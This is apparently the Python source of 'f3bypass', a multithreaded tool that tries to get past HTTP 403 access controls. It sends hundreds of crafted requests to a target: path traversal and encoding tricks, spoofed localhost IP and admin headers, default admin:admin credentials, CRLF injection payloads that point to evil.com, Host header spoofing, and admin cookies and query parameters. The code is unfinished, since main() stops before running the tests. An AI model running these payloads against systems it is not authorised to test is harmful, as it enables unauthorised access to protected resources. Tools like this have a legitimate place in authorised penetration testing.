#!/usr/bin/env python3
"""
f3bypass v1.0 - Advanced 403 Bypass Testing Tool
Author: Ali Shahsavar
"""

import argparse
import requests
import sys
import time
import json
import re
import hashlib
from urllib.parse import urlparse, urljoin, quote, unquote, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any, Tuple
from enum import Enum
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# Constants & Configuration
# ============================================================================

class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    GRAY = "\033[90m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RESET = "\033[0m"

class Status(Enum):
    SUCCESS = 200
    CREATED = 201
    ACCEPTED = 202
    NO_CONTENT = 204
    FOUND = 302
    FORBIDDEN = 403
    NOT_FOUND = 404
    ERROR = "ERR"
    TIMEOUT = "TIM"

@dataclass
class BypassResult:
    url: str
    technique: str
    category: str
    status: Any
    length: int = 0
    headers: Dict = field(default_factory=dict)
    method: str = "GET"
    body: Optional[str] = None
    error: Optional[str] = None
    response_time: float = 0.0
    is_bypass: bool = False
    bypass_score: float = 0.0

@dataclass
class BypassVariant:
    url: str
    technique: str
    category: str
    method: str = "GET"
    headers: Dict = field(default_factory=dict)
    body: Optional[str] = None
    priority: int = 5  # 1-10, higher = more likely to work

# ============================================================================
# Core Bypass Techniques
# ============================================================================

class BypassGenerator:
    """Generates all possible bypass variants"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.parsed = urlparse(target_url)
        self.base = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.path = self.parsed.path.rstrip("/") or "/"
        self.path_parts = [p for p in self.path.split("/") if p]
        self.last_segment = self.path_parts[-1] if self.path_parts else ""
        self.query = self.parsed.query
        
        # Common sensitive paths for testing
        self.sensitive_paths = [
            "/admin", "/api", "/config", "/backup", "/db", "/sql",
            "/phpmyadmin", "/wp-admin", "/console", "/debug", "/test",
            "/log", "/logs", "/tmp", "/temp", "/cache", "/upload",
            "/includes", "/lib", "/src", "/vendor", "/node_modules"
        ]
        
        # Common bypass strings
        self.bypass_strings = [
            "..;/", "..\\", ".;/", "./", "\\", "//", "///", "////",
            "?%00", "#", "%00", "%20", "%09", "%0a", "%0d", "%2e", "%2f",
            "%c0%af", "%e0%80%af", "%c1%9c", "%c0%ae"
        ]
    
    def _safe_join(self, *parts) -> str:
        """Safe URL joining with proper slashes"""
        return "/".join(p.strip("/") for p in parts if p)
    
    def _get_variant(self, url: str, technique: str, category: str, 
                     headers: Dict = None, method: str = "GET") -> BypassVariant:
        """Create a standardized variant"""
        return BypassVariant(
            url=url,
            technique=technique,
            category=category,
            method=method,
            headers=headers or {}
        )
    
    # ---- PATH MANIPULATION ----
    
    def path_case_variants(self) -> List[BypassVariant]:
        """Case manipulation bypasses"""
        variants = []
        if not self.last_segment:
            return variants
            
        for case_func in [str.lower, str.upper, str.title, str.swapcase, str.capitalize]:
            new_last = case_func(self.last_segment)
            new_path = "/".join(self.path_parts[:-1] + [new_last]) if self.path_parts[:-1] else new_last
            variants.append(self._get_variant(
                urljoin(self.base, "/" + new_path),
                f"Case: {case_func.__name__}",
                "PATH_CASE"
            ))
        return variants
    
    def path_encoding_variants(self) -> List[BypassVariant]:
        """Encoding bypasses (URL, double, unicode)"""
        variants = []
        encodings = [
            (quote, "URL"),
            (lambda x: quote(quote(x)), "Double URL"),
            (lambda x: x.replace("/", "%2f"), "Forward slash"),
            (lambda x: x.replace("/", "%2F"), "Forward slash alt"),
            (lambda x: x.replace("/", "%252f"), "Double forward slash"),
            (lambda x: x.replace("/", "%c0%af"), "Unicode overlong"),
            (lambda x: x.replace("/", "%e0%80%af"), "Unicode alt"),
            (lambda x: x.replace("/", "..;/"), "Path traversal"),
        ]
        
        for enc_func, enc_name in encodings:
            encoded_path = enc_func(self.path)
            variants.append(self._get_variant(
                urljoin(self.base, encoded_path),
                f"Encoding: {enc_name}",
                "PATH_ENCODING"
            ))
        return variants
    
    def path_traversal_variants(self) -> List[BypassVariant]:
        """Path traversal and dot segment bypasses"""
        variants = []
        traversals = [
            ("..", ".."),
            ("../", ".."),
            ("../..", ".."),
            ("../../", ".."),
            (".../", "..." )
        ]
        
        for trav, display in traversals:
            if self.path.startswith("/"):
                new_path = f"/{trav}{self.path}"
            else:
                new_path = f"{trav}{self.path}"
            variants.append(self._get_variant(
                urljoin(self.base, new_path),
                f"Traversal: {display}",
                "PATH_TRAVERSAL"
            ))
        
        # Dot segment tricks
        dot_paths = [
            f"/.{self.path}",
            f"{self.path}/.",
            f"{self.path}/./",
            f"{self.path}/..",
            f"{self.path}/../",
            f"{self.path}/..;/",
        ]
        for dp in dot_paths:
            variants.append(self._get_variant(
                urljoin(self.base, dp),
                f"Dot segment: {dp}",
                "PATH_DOT"
            ))
        return variants
    
    def path_suffix_variants(self) -> List[BypassVariant]:
        """Suffix and prefix bypasses"""
        variants = []
        suffixes = ["/", "//", "///", "?", "??", "#", "/*", "/.", "/./", "/.."]
        for suf in suffixes:
            variants.append(self._get_variant(
                urljoin(self.base, self.path + suf),
                f"Suffix: {suf}",
                "PATH_SUFFIX"
            ))
        
        # Prefix
        prefixes = ["//", "///", "/.", "./", "..;"]
        for pre in prefixes:
            variants.append(self._get_variant(
                urljoin(self.base, pre + self.path.lstrip("/")),
                f"Prefix: {pre}",
                "PATH_PREFIX"
            ))
        return variants
    
    def path_wildcard_variants(self) -> List[BypassVariant]:
        """Wildcard and glob bypasses"""
        variants = []
        wildcards = ["*", "**", ".*", "?*", "*?", "/*", "*/*"]
        
        for wc in wildcards:
            variants.append(self._get_variant(
                urljoin(self.base, self.path + "/" + wc),
                f"Wildcard: {wc}",
                "PATH_WILDCARD"
            ))
            
            variants.append(self._get_variant(
                urljoin(self.base, wc + self.path),
                f"Wildcard prefix: {wc}",
                "PATH_WILDCARD"
            ))
        return variants
    
    def path_extension_variants(self) -> List[BypassVariant]:
        """File extension bypasses"""
        extensions = [
            ".json", ".xml", ".yaml", ".yml", ".csv", ".txt",
            ".html", ".htm", ".xhtml", ".shtml",
            ".php", ".php3", ".php4", ".php5", ".phtml",
            ".asp", ".aspx", ".ashx", ".asmx",
            ".jsp", ".jspx", ".jspf",
            ".do", ".action", ".jsf",
            ".pl", ".cgi", ".py", ".rb", ".wsgi"
        ]
        
        variants = []
        base_path = self.path.rsplit(".", 1)[0] if "." in self.path.split("/")[-1] else self.path
        
        for ext in extensions:
            variants.append(self._get_variant(
                urljoin(self.base, base_path + ext),
                f"Extension: {ext}",
                "PATH_EXTENSION"
            ))
        return variants
    
    # ---- HEADER INJECTION ----
    
    def header_ip_variants(self) -> List[BypassVariant]:
        """IP address header bypasses"""
        ip_headers = [
            "X-Forwarded-For", "X-Remote-IP", "X-Client-IP", "X-Real-IP",
            "X-Originating-IP", "X-Remote-Addr", "X-ProxyUser-IP",
            "CF-Connecting-IP", "True-Client-IP", "X-Cluster-Client-IP",
            "Forwarded", "X-Forwarded-Host", "X-Host", "X-Custom-IP-Authorization",
            "X-Proxy-IP", "X-Forwarded-For-Original", "X-Original-Forwarded-For",
            "X-Forwarded-For-IP", "X-Forwarded-Client-IP", "X-Forwarded-For-Real-IP"
        ]
        
        ip_values = [
            "127.0.0.1", "localhost", "0.0.0.0", "::1", "0",
            "10.0.0.1", "192.168.1.1", "172.16.0.1", "169.254.0.1",
            "127.0.0.1:80", "127.0.0.1:443", "localhost:80"
        ]
        
        variants = []
        for header in ip_headers:
            for ip in ip_values:
                variants.append(self._get_variant(
                    self.target_url,
                    f"IP Header: {header}={ip}",
                    "HEADER_IP",
                    headers={header: ip}
                ))
        return variants
    
    def header_path_variants(self) -> List[BypassVariant]:
        """Path override header bypasses"""
        path_headers = [
            "X-Original-URL", "X-Rewrite-URL", "X-Override-URL",
            "X-Forwarded-Path", "X-Custom-URL", "X-Proxy-Path",
            "X-Forwarded-Script-Name", "X-Forwarded-Path-Info",
            "X-Script-Name", "X-Path-Info", "X-Forwarded-Context"
        ]
        
        variants = []
        path_values = [self.path, "/", "/admin", "/api", "/", "//", "/."]
        
        for header in path_headers:
            for pv in path_values:
                variants.append(self._get_variant(
                    self.target_url,
                    f"Path Header: {header}={pv}",
                    "HEADER_PATH",
                    headers={header: pv}
                ))
        return variants
    
    def header_override_variants(self) -> List[BypassVariant]:
        """Method and protocol override headers"""
        override_headers = [
            ("X-HTTP-Method-Override", "PUT"),
            ("X-HTTP-Method-Override", "PATCH"),
            ("X-HTTP-Method-Override", "DELETE"),
            ("X-HTTP-Method-Override", "OPTIONS"),
            ("X-HTTP-Method-Override", "TRACE"),
            ("X-HTTP-Method", "PUT"),
            ("X-Method-Override", "PUT"),
            ("_method", "PUT"),
            ("X-Forwarded-Proto", "http"),
            ("X-Forwarded-Proto", "https"),
            ("X-Forwarded-Scheme", "http"),
            ("X-Forwarded-Scheme", "https"),
            ("X-Original-Protocol", "http"),
            ("X-Original-Protocol", "https"),
        ]
        
        variants = []
        for header, value in override_headers:
            variants.append(self._get_variant(
                self.target_url,
                f"Override: {header}={value}",
                "HEADER_OVERRIDE",
                headers={header: value}
            ))
        return variants
    
    def header_auth_variants(self) -> List[BypassVariant]:
        """Authentication header bypasses"""
        auth_headers = [
            ("Authorization", "Basic YWRtaW46YWRtaW4="),
            ("Authorization", "Bearer null"),
            ("Authorization", "Bearer admin"),
            ("Authorization", "Bearer 12345"),
            ("X-API-Key", "1"),
            ("X-API-Key", "admin"),
            ("X-API-Key", "true"),
            ("API-Key", "admin"),
            ("X-Access-Token", "admin"),
            ("X-Proxy-Authorization", "Basic YWRtaW46YWRtaW4="),
            ("Cookie", "admin=1"),
            ("Cookie", "auth=1"),
            ("Cookie", "token=admin"),
        ]
        
        variants = []
        for header, value in auth_headers:
            variants.append(self._get_variant(
                self.target_url,
                f"Auth: {header}={value[:20]}...",
                "HEADER_AUTH",
                headers={header: value}
            ))
        return variants
    
    def header_security_variants(self) -> List[BypassVariant]:
        """Security header bypasses"""
        security_headers = [
            ("X-WAF-Bypass", "1"),
            ("X-Ignore-Rate-Limit", "1"),
            ("X-Rate-Limit-Bypass", "1"),
            ("X-No-Cache", "1"),
            ("X-Cache-Bypass", "1"),
            ("X-Content-Type-Options", "nosniff"),
            ("X-XSS-Protection", "0"),
            ("X-Frame-Options", "ALLOWALL"),
            ("Content-Security-Policy", "default-src *"),
            ("Access-Control-Allow-Origin", "*"),
            ("X-Forwarded-For-Admin", "true"),
            ("X-Admin", "true"),
            ("X-Is-Admin", "true"),
            ("X-Superuser", "true"),
            ("X-Roles", "admin"),
            ("X-Group", "admin"),
        ]
        
        variants = []
        for header, value in security_headers:
            variants.append(self._get_variant(
                self.target_url,
                f"Security: {header}={value}",
                "HEADER_SECURITY",
                headers={header: value}
            ))
        return variants
    
    def header_referer_variants(self) -> List[BypassVariant]:
        """Referer header bypasses"""
        referers = [
            self.base,
            self.base + "/",
            f"{self.base}/admin",
            "http://localhost",
            "http://127.0.0.1",
            "https://google.com",
            "https://bing.com",
            "https://www.google.com",
            f"{self.base}/admin/login",
            f"{self.base}/api",
        ]
        
        variants = []
        for ref in referers:
            variants.append(self._get_variant(
                self.target_url,
                f"Referer: {ref}",
                "HEADER_REFERER",
                headers={"Referer": ref}
            ))
            variants.append(self._get_variant(
                self.target_url,
                f"Origin: {ref}",
                "HEADER_ORIGIN",
                headers={"Origin": ref}
            ))
        return variants
    
    # ---- HTTP METHODS ----
    
    def method_variants(self) -> List[BypassVariant]:
        """HTTP method bypasses"""
        # Standard methods
        standard_methods = [
            "GET", "POST", "PUT", "DELETE", "PATCH",
            "HEAD", "OPTIONS", "TRACE", "CONNECT"
        ]
        
        # WebDAV methods
        webdav_methods = [
            "PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE",
            "LOCK", "UNLOCK", "ACL", "SEARCH", "REPORT",
            "VERSION-CONTROL", "CHECKIN", "CHECKOUT",
            "UNCHECKOUT", "MKWORKSPACE", "UPDATE", "LABEL",
            "MERGE", "BASELINE-CONTROL", "MKACTIVITY"
        ]
        
        variants = []
        for method in standard_methods + webdav_methods:
            variants.append(self._get_variant(
                self.target_url,
                f"Method: {method}",
                "METHOD",
                method=method
            ))
        return variants
    
    # ---- USER AGENT ----
    
    def useragent_variants(self) -> List[BypassVariant]:
        """User-Agent spoofing"""
        user_agents = [
            # Bots
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
            "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
            "Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot.html)",
            "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
            
            # Curl/API clients
            "curl/7.68.0",
            "curl/7.74.0",
            "python-requests/2.27.1",
            "python-requests/2.28.0",
            "PostmanRuntime/7.29.0",
            "PostmanRuntime/7.30.0",
            "Go-http-client/1.1",
            "Go-http-client/2.0",
            "Java/11.0.11",
            "Java/17.0.2",
            "aws-sdk-java/1.11",
            "aws-sdk-java/1.12",
            
            # Mobile
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 11; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
            
            # Internal/LB
            "internal-tool/1.0",
            "LB-HealthChecker/1.0",
            "HealthCheck/1.0",
            "localhost",
            "127.0.0.1",
            "nmap/7.80",
            "nikto/2.1.6",
        ]
        
        variants = []
        for ua in user_agents:
            variants.append(self._get_variant(
                self.target_url,
                f"User-Agent: {ua[:50]}...",
                "USERAGENT",
                headers={"User-Agent": ua}
            ))
        return variants
    
    # ---- PROTOCOL VARIANTS ----
    
    def protocol_variants(self) -> List[BypassVariant]:
        """Protocol manipulation"""
        variants = []
        
        # HTTP/HTTPS switching
        http_url = self.target_url.replace("https://", "http://")
        https_url = self.target_url.replace("http://", "https://")
        
        if http_url != self.target_url:
            variants.append(self._get_variant(
                http_url,
                "Protocol: HTTP downgrade",
                "PROTOCOL"
            ))
        
        if https_url != self.target_url:
            variants.append(self._get_variant(
                https_url,
                "Protocol: HTTPS upgrade",
                "PROTOCOL"
            ))
        
        # Protocol headers
        protocol_headers = [
            ("X-Forwarded-Proto", "https"),
            ("X-Forwarded-Proto", "http"),
            ("X-Forwarded-Scheme", "https"),
            ("X-Forwarded-Scheme", "http"),
            ("X-Original-Proto", "https"),
            ("X-Original-Proto", "http"),
            ("X-Forwarded-For-Scheme", "https"),
        ]
        
        for header, value in protocol_headers:
            variants.append(self._get_variant(
                self.target_url,
                f"Protocol Header: {header}={value}",
                "PROTOCOL",
                headers={header: value}
            ))
        
        return variants
    
    # ---- HOST HEADER ----
    
    def host_variants(self) -> List[BypassVariant]:
        """Host header manipulation"""
        domain = self.parsed.netloc.split(":")[0]
        
        host_values = [
            domain,
            f"localhost",
            f"127.0.0.1",
            f"0.0.0.0",
            f"::1",
            f"{domain}.evil.com",
            f"evil.com",
            f"www.evil.com",
            f"admin.evil.com",
            f"dev.evil.com",
            f"{domain}.com.evil.com",
            f"{domain}:80",
            f"{domain}:443",
            f"{domain}:8080",
            f"{domain}:8443",
            f"{domain}:3000",
            f"{domain}:5000",
            f"127.0.0.1:{self.parsed.port or 80}",
            f"localhost:{self.parsed.port or 80}",
        ]
        
        variants = []
        for host in host_values:
            variants.append(self._get_variant(
                self.target_url,
                f"Host: {host}",
                "HOST",
                headers={"Host": host}
            ))
        return variants
    
    # ---- CRLF INJECTION ----
    
    def crlf_variants(self) -> List[BypassVariant]:
        """CRLF injection bypasses"""
        crlf_payloads = [
            "%0d%0a",
            "%0d%0aX-Injected:true",
            "%0d%0a%0d%0a",
            "%0a",
            "%0aX-Custom:injected",
            "\r\n",
            "%E5%98%8A%E5%98%8D",
            "%E5%98%8A%E5%98%8DX-Test:1",
            "%23%0d%0a",
            "/%0d%0aLocation:http://evil.com",
            "%0d%0aSet-Cookie:admin=1",
            "%0d%0aX-Admin:true",
        ]
        
        variants = []
        for payload in crlf_payloads:
            new_path = self.path + payload
            variants.append(self._get_variant(
                urljoin(self.base, new_path),
                f"CRLF: {payload[:30]}...",
                "CRLF"
            ))
        return variants
    
    # ---- NULL BYTE ----
    
    def nullbyte_variants(self) -> List[BypassVariant]:
        """Null byte injection"""
        null_payloads = [
            "%00",
            "%00.html",
            "%00.php",
            "%00.jpg",
            "%00.txt",
            "%00/",
            "\x00",
            "%00index.html",
            ".%00.",
            "/%00../",
            "%00%00",
            "%00.json",
            "%00.admin",
        ]
        
        variants = []
        for payload in null_payloads:
            new_path = self.path + payload
            variants.append(self._get_variant(
                urljoin(self.base, new_path),
                f"Null Byte: {payload}",
                "NULLBYTE"
            ))
        return variants
    
    # ---- IPV6 HEADERS ----
    
    def ipv6_variants(self) -> List[BypassVariant]:
        """IPv6 header injection"""
        ipv6_values = [
            "::1",
            "::ffff:127.0.0.1",
            "0:0:0:0:0:0:0:1",
            "::ffff:0:0",
            "64:ff9b::1",
            "2001:db8::1",
            "fe80::1",
            "0000:0000:0000:0000:0000:0000:0000:0001",
            "[::1]",
            "::ffff:192.168.1.1",
        ]
        
        ipv6_headers = [
            "X-Forwarded-For",
            "X-Real-IP",
            "X-Client-IP",
            "X-Originating-IP",
            "CF-Connecting-IP",
            "X-Remote-IP",
            "X-Forwarded-Client-IP",
        ]
        
        variants = []
        for header in ipv6_headers:
            for ip in ipv6_values:
                variants.append(self._get_variant(
                    self.target_url,
                    f"IPv6: {header}={ip}",
                    "IPV6",
                    headers={header: ip}
                ))
        return variants
    
    # ---- QUERY PARAMETER ----
    
    def query_param_variants(self) -> List[BypassVariant]:
        """Query parameter manipulation"""
        admin_params = [
            "admin=true",
            "user=admin",
            "role=admin",
            "auth=1",
            "authenticated=true",
            "is_admin=true",
            "debug=true",
            "test=true",
            "bypass=true",
            "allow=true",
            "access=admin",
            "level=admin",
            "view=admin",
        ]
        
        variants = []
        separator = "?" if "?" not in self.target_url else "&"
        
        for param in admin_params:
            if "?" in self.target_url:
                variants.append(self._get_variant(
                    f"{self.target_url}&{param}",
                    f"Query: {param}",
                    "QUERY"
                ))
            else:
                variants.append(self._get_variant(
                    f"{self.target_url}?{param}",
                    f"Query: {param}",
                    "QUERY"
                ))
        return variants
    
    # ---- COOKIE ----
    
    def cookie_variants(self) -> List[BypassVariant]:
        """Cookie manipulation"""
        cookies = [
            ("admin", "1"),
            ("auth", "1"),
            ("token", "admin"),
            ("role", "admin"),
            ("user", "admin"),
            ("is_admin", "true"),
            ("authenticated", "true"),
            ("session", "admin"),
            ("cookie", "admin"),
            ("access", "admin"),
        ]
        
        variants = []
        for name, value in cookies:
            variants.append(self._get_variant(
                self.target_url,
                f"Cookie: {name}={value}",
                "COOKIE",
                headers={"Cookie": f"{name}={value}"}
            ))
        return variants
    
    # ---- CONTENT TYPE ----
    
    def content_type_variants(self) -> List[BypassVariant]:
        """Content-Type manipulation"""
        content_types = [
            "application/json",
            "application/xml",
            "application/x-www-form-urlencoded",
            "text/plain",
            "text/html",
            "multipart/form-data",
            "application/octet-stream",
            "application/javascript",
            "application/css",
            "image/jpeg",
            "image/png",
            "text/css",
            "text/csv",
            "application/gzip",
            "application/zip",
        ]
        
        variants = []
        for ct in content_types:
            variants.append(self._get_variant(
                self.target_url,
                f"Content-Type: {ct}",
                "CONTENT_TYPE",
                method="POST",
                headers={"Content-Type": ct}
            ))
        return variants
    
    # ---- CACHE HEADERS ----
    
    def cache_variants(self) -> List[BypassVariant]:
        """Cache control bypasses"""
        cache_headers = [
            ("Cache-Control", "no-cache"),
            ("Cache-Control", "no-store"),
            ("Cache-Control", "max-age=0"),
            ("Pragma", "no-cache"),
            ("X-Cache-Bypass", "1"),
            ("X-No-Cache", "1"),
            ("X-Cache", "BYPASS"),
        ]
        
        variants = []
        for header, value in cache_headers:
            variants.append(self._get_variant(
                self.target_url,
                f"Cache: {header}={value}",
                "CACHE",
                headers={header: value}
            ))
        return variants
    
    # ---- ENCODING ----
    
    def encoding_variants(self) -> List[BypassVariant]:
        """Request encoding manipulation"""
        encodings = [
            ("gzip", "gzip"),
            ("deflate", "deflate"),
            ("br", "br"),
            ("compress", "compress"),
            ("gzip, deflate", "gzip, deflate"),
            ("gzip, deflate, br", "gzip, deflate, br"),
        ]
        
        variants = []
        for encoding, value in encodings:
            variants.append(self._get_variant(
                self.target_url,
                f"Accept-Encoding: {encoding}",
                "ENCODING",
                headers={"Accept-Encoding": value}
            ))
        return variants
    
    # ---- ACCEPT HEADERS ----
    
    def accept_variants(self) -> List[BypassVariant]:
        """Accept header manipulation"""
        accept_values = [
            "*/*",
            "text/html",
            "application/json",
            "application/xml",
            "text/plain",
            "text/css",
            "application/javascript",
            "image/webp",
            "image/*",
            "application/*",
            "text/*",
        ]
        
        variants = []
        for accept in accept_values:
            variants.append(self._get_variant(
                self.target_url,
                f"Accept: {accept}",
                "ACCEPT",
                headers={"Accept": accept}
            ))
        return variants

# ============================================================================
# Bypass Engine
# ============================================================================

class BypassEngine:
    """Core bypass testing engine"""
    
    def __init__(self, threads: int = 10, timeout: int = 10, delay: float = 0):
        self.threads = threads
        self.timeout = timeout
        self.delay = delay
        self.results: List[BypassResult] = []
        self.baseline_status = None
        self.baseline_length = 0
    
    def get_baseline(self, url: str) -> Tuple[Any, int]:
        """Get baseline response for comparison"""
        try:
            resp = requests.get(url, timeout=self.timeout, verify=False, allow_redirects=True)
            return resp.status_code, len(resp.content)
        except:
            return None, 0
    
    def _has_bypass_signature(self, result: BypassResult) -> Tuple[bool, float]:
        """Analyze if response indicates a bypass"""
        score = 0.0
        is_bypass = False
        
        # Status code analysis
        if result.status in [200, 201, 202, 204]:
            score += 0.4
            if result.status == 200:
                score += 0.3
                if result.length > 100:
                    score += 0.2
        
        # Length comparison
        if result.length > self.baseline_length * 0.5:
            score += 0.2
        
        # Content analysis (if we had content)
        if result.status == 200 and result.length > 50:
            score += 0.1
        
        is_bypass = score >= 0.7
        return is_bypass, score
    
    def execute_variant(self, variant: BypassVariant) -> BypassResult:
        """Execute a single variant"""
        start_time = time.time()
        
        try:
            resp = requests.request(
                method=variant.method,
                url=variant.url,
                headers=variant.headers,
                data=variant.body,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True,
            )
            
            result = BypassResult(
                url=variant.url,
                technique=variant.technique,
                category=variant.category,
                status=resp.status_code,
                length=len(resp.content),
                headers=variant.headers,
                method=variant.method,
                response_time=time.time() - start_time
            )
            
            # Analyze bypass potential
            is_bypass, score = self._has_bypass_signature(result)
            result.is_bypass = is_bypass
            result.bypass_score = score
            
            return result
            
        except requests.exceptions.ConnectionError as e:
            return BypassResult(
                url=variant.url,
                technique=variant.technique,
                category=variant.category,
                status="ERR",
                error="Connection Error",
                response_time=time.time() - start_time
            )
        except requests.exceptions.Timeout:
            return BypassResult(
                url=variant.url,
                technique=variant.technique,
                category=variant.category,
                status="TIM",
                error="Timeout",
                response_time=time.time() - start_time
            )
        except Exception as e:
            return BypassResult(
                url=variant.url,
                technique=variant.technique,
                category=variant.category,
                status="ERR",
                error=str(e),
                response_time=time.time() - start_time
            )
    
    def run(self, url: str, enabled_categories: List[str] = None) -> List[BypassResult]:
        """Run all bypass tests"""
        generator = BypassGenerator(url)
        
        # Get baseline
        self.baseline_status, self.baseline_length = self.get_baseline(url)
        
        # Collect all variants
        all_variants = []
        
        # Category mappings
        category_map = {
            "path": generator.path_case_variants,
            "encoding": generator.path_encoding_variants,
            "traversal": generator.path_traversal_variants,
            "suffix": generator.path_suffix_variants,
            "wildcard": generator.path_wildcard_variants,
            "extension": generator.path_extension_variants,
            "header_ip": generator.header_ip_variants,
            "header_path": generator.header_path_variants,
            "header_override": generator.header_override_variants,
            "header_auth": generator.header_auth_variants,
            "header_security": generator.header_security_variants,
            "header_referer": generator.header_referer_variants,
            "methods": generator.method_variants,
            "useragent": generator.useragent_variants,
            "protocol": generator.protocol_variants,
            "host": generator.host_variants,
            "crlf": generator.crlf_variants,
            "nullbyte": generator.nullbyte_variants,
            "ipv6": generator.ipv6_variants,
            "query": generator.query_param_variants,
            "cookie": generator.cookie_variants,
            "content_type": generator.content_type_variants,
            "cache": generator.cache_variants,
            "encoding": generator.encoding_variants,
            "accept": generator.accept_variants,
        }
        
        # Build variants based on enabled categories
        for category, generator_func in category_map.items():
            if enabled_categories is None or category in enabled_categories:
                try:
                    all_variants.extend(generator_func())
                except Exception as e:
                    print(f"{Colors.RED}[!] Error generating {category}: {e}{Colors.RESET}")
        
        # Execute all variants
        print(f"{Colors.YELLOW}[*] Testing {len(all_variants)} variants...{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*80}{Colors.RESET}")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.execute_variant, v) for v in all_variants]
            
            for future in as_completed(futures):
                result = future.result()
                self.results.append(result)
                self._print_result(result)
        
        return self.results
    
    def _print_result(self, result: BypassResult):
        """Print a single result"""
        if result.status in [200, 201, 202, 204]:
            color = Colors.GREEN
            status_color = Colors.GREEN + Colors.BOLD
        elif isinstance(result.status, int) and result.status >= 400:
            color = Colors.YELLOW
            status_color = Colors.YELLOW
        elif isinstance(result.status, int) and result.status >= 300:
            color = Colors.MAGENTA
            status_color = Colors.MAGENTA
        else:
            color = Colors.GRAY
            status_color = Colors.GRAY
        
        status_str = str(result.status)
        if result.is_bypass:
            status_str += " ★"
        
        print(f"  {status_color}[{result.status}]{Colors.RESET} "
              f"{Colors.GRAY}[{result.category:<15}]{Colors.RESET} "
              f"{Colors.CYAN}{result.technique[:60]:<60}{Colors.RESET} "
              f"{Colors.GRAY}({result.length} bytes, {result.response_time:.2f}s){Colors.RESET} "
              f"{'✦' if result.is_bypass else ''}")
    
    def print_summary(self):
        """Print final summary"""
        total = len(self.results)
        if total == 0:
            return
            
        bypasses = [r for r in self.results if r.is_bypass]
        success = [r for r in self.results if r.status in [200, 201, 202, 204]]
        redirects = [r for r in self.results if isinstance(r.status, int) and 300 <= r.status < 400]
        errors = [r for r in self.results if not isinstance(r.status, int)]
        
        print(f"\n{Colors.BOLD}{'='*80}{Colors.RESET}")
        print(f"{Colors.BOLD}  SUMMARY REPORT{Colors.RESET}")
        print(f"{'='*80}")
        print(f"  Total Tests      : {total}")
        print(f"  {Colors.GREEN}Successful Bypass: {len(bypasses)}{Colors.RESET}")
        print(f"  {Colors.GREEN}2xx Success     : {len(success)}{Colors.RESET}")
        print(f"  {Colors.MAGENTA}Redirects 3xx   : {len(redirects)}{Colors.RESET}")
        print(f"  {Colors.YELLOW}Errors/Timeouts : {len(errors)}{Colors.RESET}")
        print(f"  Baseline Status  : {self.baseline_status} ({self.baseline_length} bytes)")
        
        if bypasses:
            print(f"\n{Colors.GREEN}{Colors.BOLD}  ★ POTENTIAL BYPASSES FOUND:{Colors.RESET}")
            for r in sorted(bypasses, key=lambda x: x.bypass_score, reverse=True)[:10]:
                print(f"    → [{r.category}] {r.technique}")
                print(f"      URL: {r.url}")
                if r.headers:
                    print(f"      Headers: {r.headers}")
                print(f"      Score: {r.bypass_score:.2f}")
                print()
        
        print(f"{Colors.GRAY}{'='*80}{Colors.RESET}")

# ============================================================================
# Main Entry Point
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description="f3bypass v3.0 - Advanced 403 Bypass Testing Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python f3bypass.py https://example.com/admin
  python f3bypass.py https://example.com/admin -t 20 -T 5
  python f3bypass.py https://example.com/admin --categories header_ip,methods
  python f3bypass.py https://example.com/admin --exclude path,encoding -o results.json
        """
    )
    
    parser.add_argument("url", help="Target URL (e.g., https://example.com/admin)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("-T", "--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    parser.add_argument("-d", "--delay", type=float, default=0, help="Delay between requests (default: 0)")
    parser.add_argument("-o", "--output", help="Save results to file (JSON)")
    parser.add_argument("--categories", help="Comma-separated categories to test (default: all)")
    parser.add_argument("--exclude", help="Comma-separated categories to exclude")
    parser.add_argument("--verbose", action="store_true", help="Show all responses")
    parser.add_argument("--quiet", action="store_true", help="Suppress output except summary")
    
    args = parser.parse_args()
    
    # Validate URL
    parsed = urlparse(args.url)
    if not parsed.scheme or not parsed.netloc:
        print(f"{Colors.RED}[!] Invalid URL: {args.url}{Colors.RESET}")
        sys.exit(1)
    
    # Determine categories
    all_categories = [
        "path", "encoding", "traversal", "suffix", "wildcard", "extension",
        "header_ip", "header_path", "header_override", "header_auth", 
        "header_security", "header_referer",
        "methods", "useragent", "protocol", "host", "crlf", "nullbyte",
        "ipv6", "query", "cookie", "content_type", "cache", "accept"
    ]
    
    if args.categories:
        categories = [c.strip() for c in args.categories.split(",")]
    elif args.exclude:
        exclude = [c.strip() for c in args.exclude.split(",")]
        categories = [c for c in all_categories if c not in exclude]
    else:
        categories = all_categories
    
    # Create engine and run
    engine = BypassEngine(threads=args.threads, timeout=args.timeout, delay=args.delay)
    
    print(f"{Colors.BOLD}Target: {Colors.CYAN}{args.url}{Colors.RESET}")
